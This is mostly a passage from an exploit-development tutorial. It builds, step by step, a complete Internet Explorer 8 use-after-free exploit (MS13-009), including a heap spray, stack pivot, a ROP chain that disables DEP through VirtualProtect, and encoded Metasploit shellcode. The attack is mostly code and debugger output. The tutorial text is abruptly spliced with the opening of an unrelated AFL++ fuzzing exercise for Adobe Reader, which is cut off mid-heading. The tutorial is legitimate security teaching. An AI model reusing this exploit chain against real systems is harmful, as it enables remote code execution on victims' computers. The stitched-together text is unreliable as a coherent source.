= '';\nvar Shellcode = unescape(\n'%u7546%u7a7a%u5379'+   \/\/ ASCII\n'%u6365%u7275%u7469'+   \/\/ FuzzySecurity\n'%u9079');\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nFrom the screenshot below we can see that we have overwritten EIP with\n0x90909090, the reason for this is that EIP gets its value from the\nDWORD that is located at 0x0c0c0c0c + 0x70 = 0x0c0c0c7c which points\ninto our nopslide.\nEIP in NopSlide\nThis may seem a bit confusing at first, hopefully the representation\nbelow will help clear things up!\nmshtml!CElement::Doc:\n3cf76980 8b01            mov     eax,dword ptr [ecx]      \/\/\/ eax = 0x0c0c0c0c\n3cf76982 8b5070          mov     edx,dword ptr [eax+70h]  \/\/\/ edx = 0x0c0c0c0c +\n0x70 = DWORD 0x0c0c0c7c\n3cf76985 ffd2            call    edx                      \/\/\/ call DWORD 0x0c0c0\nc7c\n________________________\n|                        |\n|        Padding         |\n|                        |\n|                        |\n|                        |\n|                        |\n|                        |\n|------------------------| <-- 0x0c0c0c0c (= EAX), this points exactly at the st\nart of our shellcode\n|       Shellcode        |     variable.\n|------------------------|\n|                        |\n|                        |\n|         NOP's          |\n|                        |\n|                        | <-- 0x0c0c0c7c (= EAX+70h), EIP is overwritten by the\nDWORD value at this\n|                        |     address, in this case 0x90909090.\n|                        |\n|                        |\n|                        |\n|                        |\n|                        |\n|     (0x1000 Block)     |\n|________________________|\nLets try to pad our shellcode variable so we can precisely overwrite\nEIP. We can do this by prepending our unescape ASCII-string with a\nbuffer length of 0x70 hex (112-bytes = 28-DWORD's).\n<!doctype html>\n<html>\n<head>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/0x5FA => offset 0x1000 hex block to 0x0c0c0c0c\nPadding = '';\nNopSlide = '';\nvar Shellcode = unescape(\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+   \/\/ Padding 0x70 hex!\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u7546%u7a7a%u5379'+   \/\/ ASCII\n'%u6365%u7275%u7469'+   \/\/ FuzzySecurity\n'%u9079');\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nAs expected we now have full control over EIP. As a reminder, the value\nin EIP is in Little Endian.\nEIP Override\nThe new layout of our 0x1000 hex block is as follows.\n________________________\n|                        |\n|        Padding         |\n|                        |\n|                        |\n|                        |\n|                        |\n|                        |\n|------------------------| <-- 0x0c0c0c0c (= EAX), this points exactly at the st\nart of our shellcode\n|                        |     variable.\n|                        |\n|       Shellcode        |\n|                        |\n|                        |\n|                        |\n|---------[EIP]----------| <-- 0x0c0c0c7c (= EAX+70h), EIP is overwritten by the\nDWORD value at this\n|                        |     address.\n|                        |\n|         NOP's          |\n|                        |\n|                        |\n|                        |\n|     (0x1000 Block)     |\n|________________________|\nOk perfect! Now we have to face our next obstacle. Our ROP-chain and\nshellcode will be located on the heap but our stack pointer (= ESP)\npoints somewhere inside mshtml. Any ROP gadget that we execute will\nreturn to the next address on the stack so we need to pivot the stack\nfrom mshtml to the area that we control on the heap (our 0x1000 byte\nblock). As you will remember EAX points exactly to the beginning of our\nshellcode variable so if we find a ROP gadget that moves EAX to ESP or\nexchanges them we will be able to pivot the stack and start executing\nour ROP-chain at 0x0c0c0c0c.\nI will be using ROP gadgets from MSVCR71.dll which comes packaged with\njava6 and is automatically loaded by Internet Explorer. I have included\ntwo text files below that were generated by [18]mona: (1)\nMSVCR71_rop_suggestions.txt which contains a list of thematically\norganized ROP gadgets and (2) MSVCR71_rop.txt which contains a raw list\nof ROP gadgets. If you want to play around with them I suggest that you\ndownload the files and parse them with regular expressions.\nMSVCR71_rop_suggestions.txt - [19]here\nMSVCR71_rop.txt - [20]here\nParsing the text file we can easily find the gadget that we need, let's\nmodify our POC and verify that everything works as expected.\n<!doctype html>\n<html>\n<head>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/0x5FA => offset 0x1000 hex block to 0x0c0c0c0c\nPadding = '';\nNopSlide = '';\nvar Shellcode = unescape(\n'%u4242%u4242'+  \/\/ EIP will be overwritten with 0x42424242 (= BBBB)\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u4141%u4141'+\n'%u8b05%u7c34'); \/\/ 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nFrom the screenshots below we can see that we hit our breakpoint on\nXCHG EAX,ESP and if we continue execution flow we successfully pivot\nthe stack and try to execute the first DWORD at 0x0c0c0c0c.\nBreakpoint - Stack Pivot\nEIP = 0x42424242\nWe are almost out of the woods. We now have to execute a ROP-chain that\ndisables DEP for a region of memory so we can execute a second stage\npayload. Fortunately MSVCR71.dll has repeatedly been abused by\nattackers and there already exists an optimized ROP-chain for this dll\nthat was created by corelanc0d3r [21]here. Let's insert this ROP-chain\nin our POC and rerun the exploit.\n<!doctype html>\n<html>\n<head>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/0x5FA => offset 0x1000 hex block to 0x0c0c0c0c\nPadding = '';\nNopSlide = '';\nvar Shellcode = unescape(\n\/\/--------------------------------------------------------[ROP]-\/\/\n\/\/ Generic ROP-chain based on MSVCR71.dll\n\/\/--------------------------------------------------------------\/\/\n\"%u653d%u7c37\" + \/\/ 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX #\nPOP EBP # RETN\n\"%ufdff%uffff\" + \/\/ 0xfffffdff : Value to negate, will become 0x00000201\n(dwSize)\n\"%u7f98%u7c34\" + \/\/ 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]\n\"%u15a2%u7c34\" + \/\/ 0x7c3415a2 : JMP [EAX] [msvcr71.dll]\n\"%uffff%uffff\" + \/\/ 0xffffffff :\n\"%u6402%u7c37\" + \/\/ 0x7c376402 : skip 4 bytes [msvcr71.dll]\n\"%u1e05%u7c35\" + \/\/ 0x7c351e05 : NEG EAX # RETN [msvcr71.dll]\n\"%u5255%u7c34\" + \/\/ 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll]\n\"%u2174%u7c35\" + \/\/ 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # R\nETN [msvcr71.dll]\n\"%u4f87%u7c34\" + \/\/ 0x7c344f87 : POP EDX # RETN [msvcr71.dll]\n\"%uffc0%uffff\" + \/\/ 0xffffffc0 : Value to negate, will become 0x00000040\n\"%u1eb1%u7c35\" + \/\/ 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll]\n\"%ud201%u7c34\" + \/\/ 0x7c34d201 : POP ECX # RETN [msvcr71.dll]\n\"%ub001%u7c38\" + \/\/ 0x7c38b001 : &Writable location [msvcr71.dll]\n\"%u7f97%u7c34\" + \/\/ 0x7c347f97 : POP EAX # RETN [msvcr71.dll]\n\"%ua151%u7c37\" + \/\/ 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT m\nsvcr71.dll]\n\"%u8c81%u7c37\" + \/\/ 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll\n]\n\"%u5c30%u7c34\" + \/\/ 0x7c345c30 : ptr to \"push esp #  ret \" [msvcr71.dll]\n\/\/-------------------------------------------------[ROP Epilog]-\/\/\n\/\/ After calling VirtalProtect() we are left with some junk.\n\/\/--------------------------------------------------------------\/\/\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" + \/\/ Junk\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\/\/-------------------------------------------[EIP - Stackpivot]-\/\/\n\/\/ EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\n\/\/--------------------------------------------------------------\/\/\n\"%u8b05%u7c34\"); \/\/ 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nFrom the screenshots we can see that we hit our first gadget after\npivoting the stack and that we reach our leftover junk after our call\nto VirtualProtect.\nROP gadget at 0x0c0c0c0c\nLeftover junk 0x41414141\nAll that is left now is to insert a short jump at the end of our junk\nbuffer that jumps over our initial EIP overwrite (XCHG EAX,ESP # RETN).\nAny shellcode that we place after our short jump will get executed!\n<!doctype html>\n<html>\n<head>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/0x5FA => offset 0x1000 hex block to 0x0c0c0c0c\nPadding = '';\nNopSlide = '';\nvar Shellcode = unescape(\n\/\/--------------------------------------------------------[ROP]-\/\/\n\/\/ Generic ROP-chain based on MSVCR71.dll\n\/\/--------------------------------------------------------------\/\/\n\"%u653d%u7c37\" + \/\/ 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX #\nPOP EBP # RETN\n\"%ufdff%uffff\" + \/\/ 0xfffffdff : Value to negate, will become 0x00000201\n(dwSize)\n\"%u7f98%u7c34\" + \/\/ 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]\n\"%u15a2%u7c34\" + \/\/ 0x7c3415a2 : JMP [EAX] [msvcr71.dll]\n\"%uffff%uffff\" + \/\/ 0xffffffff :\n\"%u6402%u7c37\" + \/\/ 0x7c376402 : skip 4 bytes [msvcr71.dll]\n\"%u1e05%u7c35\" + \/\/ 0x7c351e05 : NEG EAX # RETN [msvcr71.dll]\n\"%u5255%u7c34\" + \/\/ 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll]\n\"%u2174%u7c35\" + \/\/ 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # R\nETN [msvcr71.dll]\n\"%u4f87%u7c34\" + \/\/ 0x7c344f87 : POP EDX # RETN [msvcr71.dll]\n\"%uffc0%uffff\" + \/\/ 0xffffffc0 : Value to negate, will become 0x00000040\n\"%u1eb1%u7c35\" + \/\/ 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll]\n\"%ud201%u7c34\" + \/\/ 0x7c34d201 : POP ECX # RETN [msvcr71.dll]\n\"%ub001%u7c38\" + \/\/ 0x7c38b001 : &Writable location [msvcr71.dll]\n\"%u7f97%u7c34\" + \/\/ 0x7c347f97 : POP EAX # RETN [msvcr71.dll]\n\"%ua151%u7c37\" + \/\/ 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT m\nsvcr71.dll]\n\"%u8c81%u7c37\" + \/\/ 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll\n]\n\"%u5c30%u7c34\" + \/\/ 0x7c345c30 : ptr to \"push esp #  ret \" [msvcr71.dll]\n\/\/-------------------------------------------------[ROP Epilog]-\/\/\n\/\/ After calling VirtalProtect() we are left with some junk.\n\/\/--------------------------------------------------------------\/\/\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" + \/\/ Junk\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u04eb\" + \/\/ 0xeb04 short jump to get over what used to be EIP\n\/\/-------------------------------------------[EIP - Stackpivot]-\/\/\n\/\/ EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\n\/\/--------------------------------------------------------------\/\/\n\"%u8b05%u7c34\"); \/\/ 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nAfter executing our short jump we land just after what used to be EIP\nand we are home free to execute any shellcode of our choosing!\n0xeb04 short jump\nShellcode + Game Over\nTime for the easy part, let's generate some shellcode!\nroot@Trident:~# msfpayload windows\/messagebox O\nName: Windows MessageBox\nModule: payload\/windows\/messagebox\nVersion: 0\nPlatform: Windows\nArch: x86\nNeeds Admin: No\nTotal size: 270\nRank: Normal\nProvided by:\ncorelanc0d3r <peter.ve@corelan.be>\njduck <jduck@metasploit.com>\nBasic options:\nName      Current Setting   Required  Description\n----      ---------------   --------  -----------\nEXITFUNC  process           yes       Exit technique: seh, thread, process, none\nICON      NO                yes       Icon type can be NO, ERROR, INFORMATION, W\nARNING or QUESTION\nTEXT      Hello, from MSF!  yes       Messagebox Text (max 255 chars)\nTITLE     MessageBox        yes       Messagebox Title (max 255 chars)\nDescription:\nSpawns a dialog via MessageBox using a customizable title, text &\nicon\nroot@Trident:~# msfpayload windows\/messagebox text='Bang, bang!' title='b33f' R|\nmsfencode -t js_le\n[*] x86\/shikata_ga_nai succeeded with size 282 (iteration=1)\n%ud1bb%u6f46%ud9e9%ud9c7%u2474%u5af4%uc931%u40b1%uc283%u3104%u115a%u5a03%ue211%u\n9f24%u7284\n%u541f%u717f%u47ae%u0ecd%uaee1%u7a56%u0170%u0a1c%uea7e%uef54%uaaf5%u8490%u1377%u\nac2a%u1cbf\n%ua434%ufb4c%u9745%u1d4d%u9c25%ufadd%u2982%u3f58%u7940%u474a%u6857%ufd01%ue74f%u\n224f%u1c71\n%u168c%u6938%udc66%u83bb%u1db7%u9b8a%u4d4b%udb69%u89c7%u13b3%u972a%u47f4%uacc0%u\nb386%ua600\n%u3797%u6c0a%ua359%ue7cc%u7855%ua29b%u7f79%ud970%uf486%u3687%u4e0f%udaa3%u8c71%u\nea19%uc658\n%u0ed4%u2413%u5e8e%ua76a%u0da2%u289b%u4dc5%udea4%ub67c%u9fe0%u54a6%ue765%ubd4a%u\n0fd8%u42fc\n%u3023%uf889%ua7d4%u6ee5%u76c5%u5d9d%u5737%uca39%ud442%u78a4%u4625%u7702%u91bc%u\n781c%u59eb\n%u4429%ud944%ueb81%ua128%uf756%u8b96%u69b0%ud428%u02bf%u0b8e%uf31f%u2e46%uc06c%u\n9ff0%uae49\n%ufba1%u2669%u6cba%u5f1f%u351c%ub3b7%ua77e%ua426%u463c%u53c6%u41f0%ud09e%u5ad6%u\n0917%u8f27\n%u9975%u7d19%ucd86%u41ab%u1128%u499e\nOk now lets clean up our POC, add comments and run the final exploit. I\nwant to mention again that this vulnerability has some reliability\nissues (only triggers properly 80% of the time), if anyone has any\ninput about this please leave a comment below.\n<!-----------------------------------------------------------------------------\n\/\/ Exploit: MS13-009 Use-After-Free IE8 (DEP)                                \/\/\n\/\/ Author: b33f - http:\/\/www.fuzzysecurity.com\/                              \/\/\n\/\/ OS: Tested on XP PRO SP3                                                  \/\/\n\/\/ Browser: Internet Explorer 8.00.6001.18702                                \/\/\n\/\/---------------------------------------------------------------------------\/\/\n\/\/ This exploit was created for Part 9 of my Exploit Development tutorial    \/\/\n\/\/ series => http:\/\/www.fuzzysecurity.com\/tutorials\/expDev\/11.html           \/\/\n------------------------------------------------------------------------------>\n<!doctype html>\n<html>\n<head>\n<script>\n\/\/Fix BSTR spec\nfunction alloc(bytes, mystr) {\nwhile (mystr.length<bytes) mystr += mystr;\nreturn mystr.substr(0, (bytes-6)\/2);\n}\nblock_size = 0x1000;\npadding_size = 0x5F4; \/\/0x5FA => offset 0x1000 hex block to 0x0c0c0c0c\nPadding = '';\nNopSlide = '';\nvar Shellcode = unescape(\n\/\/--------------------------------------------------------[ROP]-\/\/\n\/\/ Generic ROP-chain based on MSVCR71.dll\n\/\/--------------------------------------------------------------\/\/\n\"%u653d%u7c37\" + \/\/ 0x7c37653d : POP EAX # POP EDI # POP ESI # POP EBX #\nPOP EBP # RETN\n\"%ufdff%uffff\" + \/\/ 0xfffffdff : Value to negate, will become 0x00000201\n(dwSize)\n\"%u7f98%u7c34\" + \/\/ 0x7c347f98 : RETN (ROP NOP) [msvcr71.dll]\n\"%u15a2%u7c34\" + \/\/ 0x7c3415a2 : JMP [EAX] [msvcr71.dll]\n\"%uffff%uffff\" + \/\/ 0xffffffff :\n\"%u6402%u7c37\" + \/\/ 0x7c376402 : skip 4 bytes [msvcr71.dll]\n\"%u1e05%u7c35\" + \/\/ 0x7c351e05 : NEG EAX # RETN [msvcr71.dll]\n\"%u5255%u7c34\" + \/\/ 0x7c345255 : INC EBX # FPATAN # RETN [msvcr71.dll]\n\"%u2174%u7c35\" + \/\/ 0x7c352174 : ADD EBX,EAX # XOR EAX,EAX # INC EAX # R\nETN [msvcr71.dll]\n\"%u4f87%u7c34\" + \/\/ 0x7c344f87 : POP EDX # RETN [msvcr71.dll]\n\"%uffc0%uffff\" + \/\/ 0xffffffc0 : Value to negate, will become 0x00000040\n\"%u1eb1%u7c35\" + \/\/ 0x7c351eb1 : NEG EDX # RETN [msvcr71.dll]\n\"%ud201%u7c34\" + \/\/ 0x7c34d201 : POP ECX # RETN [msvcr71.dll]\n\"%ub001%u7c38\" + \/\/ 0x7c38b001 : &Writable location [msvcr71.dll]\n\"%u7f97%u7c34\" + \/\/ 0x7c347f97 : POP EAX # RETN [msvcr71.dll]\n\"%ua151%u7c37\" + \/\/ 0x7c37a151 : ptr to &VirtualProtect() - 0x0EF [IAT m\nsvcr71.dll]\n\"%u8c81%u7c37\" + \/\/ 0x7c378c81 : PUSHAD # ADD AL,0EF # RETN [msvcr71.dll\n]\n\"%u5c30%u7c34\" + \/\/ 0x7c345c30 : ptr to \"push esp #  ret \" [msvcr71.dll]\n\/\/-------------------------------------------------[ROP Epilog]-\/\/\n\/\/ After calling VirtalProtect() we are left with some junk.\n\/\/--------------------------------------------------------------\/\/\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" + \/\/ Junk\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u4141\" +\n\"%u4141%u04eb\" + \/\/ 0xeb04 short jump to get over what used to be EIP\n\/\/-------------------------------------------[EIP - Stackpivot]-\/\/\n\/\/ EIP = 0x7c342643 # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\n\/\/--------------------------------------------------------------\/\/\n\"%u8b05%u7c34\" + \/\/ 0x7c348b05 : # XCHG EAX,ESP # RETN    ** [MSVCR71.dll]\n\/\/--------------------------------------------------[shellcode]-\/\/\n\/\/ js Little Endian Messagebox => \"Bang, bang!\"\n\/\/--------------------------------------------------------------\/\/\n\"%ud1bb%u6f46%ud9e9%ud9c7%u2474%u5af4%uc931%u40b1%uc283%u3104%u115a%u5a0\n3%ue211\" +\n\"%u9f24%u7284%u541f%u717f%u47ae%u0ecd%uaee1%u7a56%u0170%u0a1c%uea7e%uef5\n4%uaaf5\" +\n\"%u8490%u1377%uac2a%u1cbf%ua434%ufb4c%u9745%u1d4d%u9c25%ufadd%u2982%u3f5\n8%u7940\" +\n\"%u474a%u6857%ufd01%ue74f%u224f%u1c71%u168c%u6938%udc66%u83bb%u1db7%u9b8\na%u4d4b\" +\n\"%udb69%u89c7%u13b3%u972a%u47f4%uacc0%ub386%ua600%u3797%u6c0a%ua359%ue7c\nc%u7855\" +\n\"%ua29b%u7f79%ud970%uf486%u3687%u4e0f%udaa3%u8c71%uea19%uc658%u0ed4%u241\n3%u5e8e\" +\n\"%ua76a%u0da2%u289b%u4dc5%udea4%ub67c%u9fe0%u54a6%ue765%ubd4a%u0fd8%u42f\nc%u3023\" +\n\"%uf889%ua7d4%u6ee5%u76c5%u5d9d%u5737%uca39%ud442%u78a4%u4625%u7702%u91b\nc%u781c\" +\n\"%u59eb%u4429%ud944%ueb81%ua128%uf756%u8b96%u69b0%ud428%u02bf%u0b8e%uf31\nf%u2e46\" +\n\"%uc06c%u9ff0%uae49%ufba1%u2669%u6cba%u5f1f%u351c%ub3b7%ua77e%ua426%u463\nc%u53c6\" +\n\"%u41f0%ud09e%u5ad6%u0917%u8f27%u9975%u7d19%ucd86%u41ab%u1128%u499e\");\nfor (p = 0; p < padding_size; p++){\nPadding += unescape('%ub33f');}\nfor (c = 0; c < block_size; c++){\nNopSlide += unescape('%u9090');}\nNopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding\n.length));\nvar OBJECT = Padding + Shellcode + NopSlide;\nOBJECT = alloc(0xfffe0, OBJECT); \/\/ 0xfffe0 = 1mb\nvar evil = new Array();\nfor (var k = 0; k < 150; k++) {\nevil[k] = OBJECT.substr(0, OBJECT.length);\n}\nvar data;\nvar objArray = new Array(1150);\nsetTimeout(function(){\ndocument.body.style.whiteSpace = \"pre-line\";\n\/\/CollectGarbage();\nfor (var i=0;i<1150;i++){\nobjArray[i] = document.createElement('div');\nobjArray[i].className = data += unescape(\"%u0c0c%u0c0c\");\n}\nsetTimeout(function(){document.body.innerHTML = \"boo\"}, 100)\n}, 100)\n<\/script>\n<\/head>\n<body>\n<p> <\/p>\n<\/body>\n<\/html>\nGame Over!\n\u00a9 Copyright [22]FuzzySecurity\n[23]Home | [24]Tutorials | [25]Scripting | [26]Exploits | [27]Links |\n[28]Contact"}
{"text":"# Exercise 8 - Adobe Reader\n\nFor this exercise, we will fuzz **Adobe Reader** application. The goal is to find an Out-of-bounds vulnerability in Adobe Reader 9.5.1.\n\n## What you will learn\nOnce you complete this exercise you will know:\n- How to use AFL++'s QEMU mode to fuzz closed-source applications\n- How to enable persistent mode in QEMU mode\n- How to use QASAN, a binary-only sanitizer\n\n## Read Before Start\n- I suggest you try to **solve the exercise by yourself** without checking the solution. Try as hard as you can, and only if you get stuck, check out the example solution below.\n- AFL uses a non-deterministic testing algorithm, so two fuzzing sessions are never the same. That's why I highly recommend **to set a fixed seed (-s 123)**. This way your fuzzing results will be similar to those shown here and that will allow you to follow the exercises more easily.  \n- If you find a new vulnerability, **please submit a security report** to the project. If you need help or have any doubt about the process, the [GitHub Security Lab](mailto:securitylab.github.com) can help you with it :)\n\n## Contact\nAre you stuck and looking for help? Do you have suggestions for making this course better or just positive feedback so that we create more fuzzing content?\nDo you want to share your fuzzing experience with the community?\nJoin the GitHub Security Lab Slack and head to the `#fuzzing` channel. [Request an invite to the GitHub Security Lab Slack](mailto:securitylab-social@github.com?subject=Request%20an%20invite%20to%20the%20GitHub%20Security%20Lab%20Slack)\n\n## Environment\n\nAll the exercises have been tested on **Ubuntu 20.04.2 LTS**. I highly recommend you to use **the same OS version** to avoid different fuzzing results and to run AFL++ **on bare-metal** hardware, and not virtualized machines, for best performance.\n\nOtherwise, you can find an Ubuntu 20.04.2 LTS VMware image [here](https:\/\/drive.google.com\/file\/d\/1_m1x-SHcm7Muov2mlmbbt8nkrMYp0Q3K\/view?usp=sharing). You can also use VirtualBox instead of VMware.\n\nThe username \/ password for this VM are `fuzz` \/ `fuzz`.\n\n## Do it yourself!\nIn order to complete this exercise, you need to:\n1) Create a seed corpus of PDF samples\n2) Enable persistent mode\n3) Fuzz Adobe Reader using QEMU mode until you have some crashes\n4) Triage the crashes to find a PoC for the vulnerability\n\n\n**Estimated time = 8 hours**\n\n---------------------------------------------------------------------------------------------------------------------------------------------------\n\n<details>\n  <summary>SPOILER ALERT! : Solution inside<\/summary>\n\n### AFL++'s QEMU installation\n\nFirst of all, we need afl-qemu installed in our system. You can check it with the following command:\n\n```\nafl-qemu-trace --help\n```\n\nand you should see something like that:\n\n![](Images\/0.png)\n\nIf it's not already installed, you can build and install it with:\n\n```\nsudo apt install ninja-build libc6-dev-i386\ncd ~\/Downloads\/AFLplusplus\/qemu_mode\/\nCPU_TARGET=i386 .\/build_qemu_support.sh\nmake distrib\nsudo make install\n```\n\nwhere ``\/Downloads\/AFLplusplus\/`` is the [AFL++ root folder](..\/Exercise%201#install-afl)\n\n### Adobe Reader 